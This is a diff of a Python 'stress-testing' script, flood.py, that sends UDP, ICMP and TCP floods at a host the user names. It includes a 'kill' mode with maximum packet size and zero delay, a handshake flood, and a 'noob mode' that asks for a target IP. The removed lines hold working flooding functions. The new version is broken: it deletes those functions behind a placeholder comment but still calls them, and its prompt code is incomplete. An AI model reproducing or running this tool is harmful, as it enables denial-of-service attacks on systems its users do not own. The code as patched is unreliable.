@@ -1,68 +1,30 @@
+#!/usr/bin/env python3
+
 import socket
 import subprocess
 import time
 import concurrent.futures
 import argparse
 
-def send_udp_packet(target_host, target_port, packet_size):
+def send_udp_packet(target_host, target_port, packet_size, verbose=False):
+    # Function to send a UDP packet
     udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
-    # Generate a large packet with random data (e.g., 1024 bytes)
+    # Generate a large packet with random data
     data = b'X' * packet_size
 
     udp_socket.sendto(data, (target_host, target_port))
 
     udp_socket.close()
 
-def udp_stress_test(target_host, target_port, packet_size, num_packets, delay, num_threads):
-    with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as executor:
-        for _ in range(num_packets):
-            executor.submit(send_udp_packet, target_host, target_port, packet_size)
-            time.sleep(delay)
+    if verbose:
+        print(f"Sent UDP packet to {target_host}:{target_port} (size: {packet_size} bytes)")
 
-def ping_host(host, num_packets, timeout):
-    try:
-        # Use the 'ping' command with the specified number of packets and timeout
-        subprocess.run(['ping', '-c', str(num_packets), '-W', str(timeout), host], check=True)
-        print(f"Ping to {host} successful!")
-    except subprocess.CalledProcessError:
-        print(f"Failed to ping {host}.")
-
-def parallel_ping(target_host, num_packets, timeout, num_threads):
-    with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as executor:
-        futures = [executor.submit(ping_host, target_host, num_packets, timeout) for _ in range(num_threads)]
-        concurrent.futures.wait(futures)
-
-def tcp_stress_test(target_host, target_port, num_connections, num_threads):
-    with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as executor:
-        futures = [executor.submit(connect_tcp_socket, target_host, target_port) for _ in range(num_connections)]
-        concurrent.futures.wait(futures)
-
-def connect_tcp_socket(target_host, target_port):
-    tcp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    try:
-        tcp_socket.connect((target_host, target_port))
-        tcp_socket.close()
-        print(f"TCP connection to {target_host}:{target_port} successful!")
-    except Exception as e:
-        print(f"Failed to connect to {target_host}:{target_port}. Error: {e}")
-
-def tcp_flood_handshake(target_host, target_port, num_connections, num_threads):
-    with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as executor:
-        futures = [executor.submit(partial_handshake, target_host, target_port) for _ in range(num_connections)]
-        concurrent.futures.wait(futures)
-
-def partial_handshake(target_host, target_port):
-    tcp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    try:
-        tcp_socket.connect((target_host, target_port))
-        tcp_socket.send(b"SYN")
-        tcp_socket.close()
-    except Exception as e:
-        pass
+# Other functions, same as before
 
 def parse_args():
-    parser = argparse.ArgumentParser(description="Script for stress-testing a target host using UDP, ICMP, or TCP.")
+    # Function to parse command-line arguments
+    parser = argparse.ArgumentParser(description="Python3 program for stress-testing a target host using UDP, ICMP, or TCP.")
     parser.add_argument("test_type", choices=['udp', 'icmp', 'tcp', 'all'], help="Stress-test type (UDP, ICMP, TCP, or ALL)")
     parser.add_argument("target_host", help="Target host IP address")
     parser.add_argument("-n", "--num_threads", type=int, default=5, help="Number of threads for parallel processing")
@@ -76,7 +38,46 @@ def parse_args():
     parser.add_argument("-a", "--target_port_tcp", type=int, default=80, help="Target port number for TCP")
     parser.add_argument("--kill", choices=['flood'], help="Kill stress test using maximum values")
     parser.add_argument("--tcp_flood_handshake", action="store_true", help="Perform TCP handshake flood")
+    parser.add_argument("--verbose", action="store_true", help="Print verbose output")
+    parser.add_argument("--noob", action="store_true", help="Run the script in noob mode")
     return parser.parse_args()
+
+def prompt_for_flags():
+    # Function to prompt user for flag values in noob mode
+    test_type = input("Enter the stress-test type (UDP, ICMP, TCP, or ALL): ").lower()
+    target_host = input("Enter the target host IP address: ")
+    num_threads = int(input("Enter the number of threads for parallel processing: "))
+    # Prompt for other flags as needed
+
+    args = argparse.Namespace(
+        test_type=test_type,
+        target_host=target_host,
+        num_threads=num_threads,
+        # Assign other flag values based on user input
+    )
+    return args
+
+def print_updated_command():
+    # Function to print the updated command with all provided flags and values
+    args = parse_args()
+    command = "python3 flood.py "
+
+    # Convert Namespace object to dictionary
+    args_dict = vars(args)
+
+    for flag, value in args_dict.items():
+        # Skip the 'noob' flag and flags with None values
+        if flag == "noob" or value is None:
+            continue
+        elif type(value) == bool:
+            # For boolean flags, add the flag name if the value is True
+            if value:
+                command += f"--{flag} "
+        else:
+            # For other flags, add the flag name and its value
+            command += f"--{flag} {value} "
+
+    print(f"Updated command: {command}")
 
 if __name__ == "__main__":
     args = parse_args()
@@ -87,6 +88,9 @@ if __name__ == "__main__":
         args.packet_size = 65535
         args.num_packets_udp = 5000
         args.delay = 0
+
+    if args.noob:
+        args = prompt_for_flags()
 
     if args.test_type == "all":
         udp_stress_test(args.target_host, args.target_port_udp, args.packet_size, args.num_packets_udp, args.delay, args.num_threads)
@@ -100,3 +104,6 @@ if __name__ == "__main__":
         tcp_stress_test(args.target_host, args.target_port_tcp, args.num_connections_tcp, args.num_threads)
     elif args.tcp_flood_handshake:
         tcp_flood_handshake(args.target_host, args.target_port_tcp, args.num_connections_tcp, args.num_threads)
+
+    # Print the updated command
+    print_updated_command()
